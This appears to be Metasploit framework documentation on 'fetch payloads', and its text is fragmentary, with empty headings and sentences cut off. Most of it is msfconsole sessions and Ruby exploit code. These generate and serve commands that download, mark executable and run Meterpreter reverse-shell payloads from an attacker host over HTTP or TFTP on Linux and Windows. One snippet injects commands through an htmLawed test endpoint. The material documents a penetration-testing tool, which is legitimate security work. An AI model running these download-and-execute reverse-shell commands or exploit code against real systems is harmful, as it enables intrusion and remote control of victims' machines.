# Fetch Payloads
## What Are Fetch Payloads?
## Terminology
## Organization
## A Simple Stand-Alone Example
First, let's look at the payload in isolation:
```msf
msf6 exploit(multi/ssh/sshexec) > use payload/cmd/linux/http/x64/meterpreter/reverse_tcp
msf6 payload(cmd/linux/http/x64/meterpreter/reverse_tcp) > show options

Module options (payload/cmd/linux/http/x64/meterpreter/reverse_tcp):

Name                Current Setting  Required  Description
   ----                ---------------  --------  -----------
FETCH_COMMAND       CURL             yes       Command to fetch payload (Accepted: CURL, FTP, TFTP, TNFTP, WGET)
FETCH_FILENAME      YXeSdwsoEfOH     no        Name to use on remote system when storing payload
FETCH_SRVHOST       0.0.0.0          yes       Local IP to use for serving payload
FETCH_SRVPORT       8080             yes       Local port to use for serving payload
FETCH_URIPATH                        no        Local URI to use for serving payload
FETCH_WRITABLE_DIR                   yes       Remote writable dir to store payload
LHOST                                yes       The listen address (an interface may be specified)
LPORT               4444             yes       The listen port


View the full module info with the info, or info -d command.

msf6 payload(cmd/linux/http/x64/meterpreter/reverse_tcp) > 
```

### Options
### Generating the Fetch Payload

```msf
msf6 payload(cmd/linux/http/x64/meterpreter/reverse_tcp) > set FETCH_COMMAND WGET
FETCH_COMMAND => WGET
msf6 payload(cmd/linux/http/x64/meterpreter/reverse_tcp) > set FETCH_SRVHOST 10.5.135.201
FETCH_SRVHOST => 10.5.135.201
msf6 payload(cmd/linux/http/x64/meterpreter/reverse_tcp) > set FETCH_SRVPORT 8000
FETCH_SRVPORT => 8000
msf6 payload(cmd/linux/http/x64/meterpreter/reverse_tcp) > set LHOST 10.5.135.201
LHOST => 10.5.135.201
msf6 payload(cmd/linux/http/x64/meterpreter/reverse_tcp) > set LPORT 4567
LPORT => 4567
msf6 payload(cmd/linux/http/x64/meterpreter/reverse_tcp) > generate -f raw
wget -qO ./YXeSdwsoEfOH http://10.5.135.201:8000/3cP1jDrJ3uWM1WrsRx3HTw; chmod +x ./YXeSdwsoEfOH; ./YXeSdwsoEfOH &
msf6 payload(cmd/linux/http/x64/meterpreter/reverse_tcp) > 
```

### Starting the Fetch Server
started:
```msf
msf6 payload(cmd/linux/http/x64/meterpreter/reverse_tcp) > to_handler
[*] wget -qO ./YBybOrAmkV http://10.5.135.201:8000/3cP1jDrJ3uWM1WrsRx3HTw; chmod +x ./YBybOrAmkV; ./YBybOrAmkV &
[*] Payload Handler Started as Job 0
[*] Fetch Handler listening on 10.5.135.201:8000
[*] http server started
[*] Started reverse TCP handler on 10.5.135.201:4567 
```

### Fetch Handlers and Served Payload Handlers
`Jobs`, even though the Fetch Handler is listening:
```msf
msf6 payload(cmd/linux/http/x64/meterpreter/reverse_tcp) > jobs -l

Jobs
====

  Id  Name                    Payload                                     Payload opts
  --  ----                    -------                                     ------------
  0   Exploit: multi/handler  cmd/linux/http/x64/meterpreter/reverse_tcp  tcp://10.5.135.201:4567

msf6 payload(cmd/linux/http/x64/meterpreter/reverse_tcp) > netstat -ant | grep 8000
[*] exec: netstat -ant | grep 8000

tcp        0      0 10.5.135.201:8000       0.0.0.0:*               LISTEN     

```

Killing the Served Payload handler will kill the Fetch Handler as well:
```msf
msf6 payload(cmd/linux/http/x64/meterpreter/reverse_tcp) > jobs -k 0
[*] Stopping the following job(s): 0
[*] Stopping job 0
msf6 payload(cmd/linux/http/x64/meterpreter/reverse_tcp) > netstat -ant | grep 8000
[*] exec: netstat -ant | grep 8000

msf6 payload(cmd/linux/http/x64/meterpreter/reverse_tcp) > 
```

## Using Fetch Payloads on the Fly
## Using it in an exploit
### Example paired with CmdStager
payloads.  All I did was give an array value for the `Platform` value and change the`Type` to something more generic:
``` ruby
'Targets'   =>
  [
    [ 'Linux Command',
      {
        'Arch' => [ ARCH_CMD ],
        'Platform' => [ 'unix', 'linux' ],
        'Type' => :nix_cmd
      }
    ]
  ]
```

For the `execute_command` method, nothing changes:
```ruby
def execute_command(cmd, _opts = {})
populate_values if @sid.nil? || @token.nil?
uri = datastore['URIPATH'] + '/vendor/htmlawed/htmlawed/htmLawedTest.php'

    send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(uri),
      'cookie' => 'sid=' + @sid,
      'ctype' => 'application/x-www-form-urlencoded',
      'encode_params' => true,
      'vars_post' => {
        'token' => @token,
        'text' => cmd,
        'hhook' => 'exec',
        'sid' => @sid
      }
    })
end
```

needs to change.
```ruby
  def exploit
    print_status("Executing #{target.name} for #{datastore['PAYLOAD']}")
    case target['Type']
    when :nix_cmd
      execute_command(payload.encoded)
    when :linux_dropper
      execute_cmdstager
    end
  end
```

like Fetch Payloads, you can simply add the `linux` value to the platform array:
```ruby
'Nix Command',
  {
    'Platform' => [ 'unix', 'linux' ],
    'Arch' => ARCH_CMD,
    'Type' => :unix_cmd,
  }
```

## Supported Commands
### Windows And Linux Both
#### `CURL` 
#### `TFTP` 
start a tftp fetch handler, a new service will start:
```msf
msf6 payload(cmd/windows/tftp/x64/meterpreter/reverse_tcp) > jobs

Jobs
====

  Id  Name                    Payload                                       Payload opts
  --  ----                    -------                                       ------------
  2   Exploit: multi/handler  cmd/windows/tftp/x64/meterpreter/reverse_tcp  tcp://10.5.135.201:4444

msf6 payload(cmd/windows/tftp/x64/meterpreter/reverse_tcp) > set LPORT 4445
LPORT => 4445
msf6 payload(cmd/windows/tftp/x64/meterpreter/reverse_tcp) > to_handler

[*] Command to run on remote host: curl -so plEYxIdBQna.exe tftp://10.5.135.201:8080/test1 & start /B plEYxIdBQna.exe
[*] Payload Handler Started as Job 4

[*] starting tftpserver on 10.5.135.201:8080
[*] Started reverse TCP handler on 10.5.135.201:4445 
msf6 payload(cmd/windows/tftp/x64/meterpreter/reverse_tcp) > jobs

Jobs
====

  Id  Name                    Payload                                       Payload opts
  --  ----                    -------                                       ------------
  2   Exploit: multi/handler  cmd/windows/tftp/x64/meterpreter/reverse_tcp  tcp://10.5.135.201:4444
  4   Exploit: multi/handler  cmd/windows/tftp/x64/meterpreter/reverse_tcp  tcp://10.5.135.201:4445

msf6 payload(cmd/windows/tftp/x64/meterpreter/reverse_tcp) > netstat -an | grep 8080
[*] exec: netstat -an | grep 8080

udp        0      0 10.5.135.201:8080       0.0.0.0:*                          
udp        0      0 10.5.135.201:8080       0.0.0.0:*                          
msf6 payload(cmd/windows/tftp/x64/meterpreter/reverse_tcp) > set FETCH_URIPATH test4
FETCH_URIPATH => test4
msf6 payload(cmd/windows/tftp/x64/meterpreter/reverse_tcp) > set LPORT 8547
LPORT => 8547
msf6 payload(cmd/windows/tftp/x64/meterpreter/reverse_tcp) > to_handler

[*] Command to run on remote host: curl -so DOjmRoCOSMn.exe tftp://10.5.135.201:8080/test4 & start /B DOjmRoCOSMn.exe
[*] Payload Handler Started as Job 5

[*] starting tftpserver on 10.5.135.201:8080
[*] Started reverse TCP handler on 10.5.135.201:8547 
msf6 payload(cmd/windows/tftp/x64/meterpreter/reverse_tcp) > netstat -an | grep 8080
[*] exec: netstat -an | grep 8080

udp        0      0 10.5.135.201:8080       0.0.0.0:*                          
udp        0      0 10.5.135.201:8080       0.0.0.0:*                          
udp        0      0 10.5.135.201:8080       0.0.0.0:*                          

```

